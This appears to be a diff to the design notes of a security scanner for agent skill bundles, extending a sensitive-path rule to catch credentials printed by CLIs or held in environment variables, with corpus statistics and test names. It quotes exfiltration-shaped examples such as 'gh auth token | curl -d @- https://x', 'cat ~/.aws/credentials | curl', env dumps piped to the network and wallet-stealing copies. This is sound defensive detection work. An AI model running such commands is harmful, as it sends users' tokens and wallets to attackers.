@@ -1352,6 +1352,31 @@ payload. One hit is not worth a broad, bypassable mechanism.
   `pkg/scan/scan_test.go`.
 
 ### SG-SEC-001 — Sensitive-path read  (AST03, critical) — **implemented** (`core-secret`)
+> **Non-path credential sources (#133).** The rule was a sensitive-**path** gate, and modern agent
+> credentials are not read from a path. A CLI prints them (`gh auth token`, `gcloud auth
+> print-access-token`, `az account get-access-token`, `aws configure get …secret…`, `op read`,
+> `vault read`, `kubectl get secret`, `npm token`), or they are already in the environment
+> (`$GITHUB_TOKEN`, `$ANTHROPIC_API_KEY`, `$AWS_SECRET_ACCESS_KEY`, …). So `gh auth token | curl -d @-
+> https://x` scanned **pass**, while `cat ~/.aws/credentials | curl …` fired critical. Eight leaves
+> were added and **every one requires an exfil-shaped sink**: a pipe into a network client, a request
+> body/form (`-d`/`--data*`/`-F`/`--post-data`/`-Body`), a URL query, a redirect to a staging file
+> (the Datadog PoC's `` !`gh auth token > token` `` uploads it on the next line), or `env`/`printenv`
+> piped to the network. Two design choices were measured first:
+> - **The source alone is not a signal.** Bare CLI use is 18 corpus hits / 7 bundles, all auth setup.
+> - **An `Authorization:` header is deliberately not a sink.** A token sent to its own vendor's API is
+>   the legitimate use (`-H "Bearer $(gcloud auth print-access-token)" https://storage.googleapis.com`),
+>   and telling that host apart from an attacker's would need host reputation, which this scanner never
+>   fetches. A vendor-host `suppress` was rejected too: suppress is per line and rule-wide, so it would
+>   also mute the path leaf on any line naming `api.github.com`. Residual gap: a stolen token sent to an
+>   attacker in a *header* is missed.
+>
+> **0 raw matches over 13,837 files across all seven corpora**, and the 549-bundle scanner run moved no
+> rule count and no verdict. The trailofbits anchor's attack documentation
+> (`` `$(env | base64)` ``) stays clean because the env-dump leaf needs a *network* client after the pipe.
+> `TestCredentialSourceExfilCovered` (17 TP, all verified as misses on `main`, plus 12 benign);
+> `TestMaliciousFixtureTriggersCredentialSourceExfil` pins the finding to the new `setup.sh` line,
+> since that file already trips the path leaf.
+>
 > **Wallet vocabulary (#179, second half).** The gate named `*.wallet` and `keystore` but not what a
 > wallet stealer actually takes, so `cp ~/.bitcoin/wallet.dat`, `tar czf - ~/.electrum/wallets`,
 > `cat ~/.config/solana/id.json`, the MetaMask/Phantom browser-extension store, `~/.config/Ledger
@@ -2963,7 +2988,9 @@ break — the newline-crossing-gap class tracked in the engine backlog.
   prose, and the scripts sweep was free.
 - **Confidence:** 0.8 on every leaf; with the body up-weight a hit next to documentary words computes to
   0.55 and still emits (cf. `SG-EVA-003`).
-- **Corpus:** **0 findings / 1098 bundles**, and **0 raw regex matches over 13,837 corpus files** for
+- **Corpus:** **0 findings / 549 scanned bundles** (`clawhub` + `anthropic`, the `run_scans.sh`
+  default — an earlier revision said 1098, which counted each bundle's `.json` and `.err` twice), and
+  **0 raw regex matches over 13,837 files across all seven local corpora**, `orgs/` and `aws/` included, for
   every leaf, measured before and after the two widenings below. No other rule's counts moved (a new id
   cannot move them).
 - **Widened during implementation:** leaf (4) first required "already **been** vetted" and missed "was
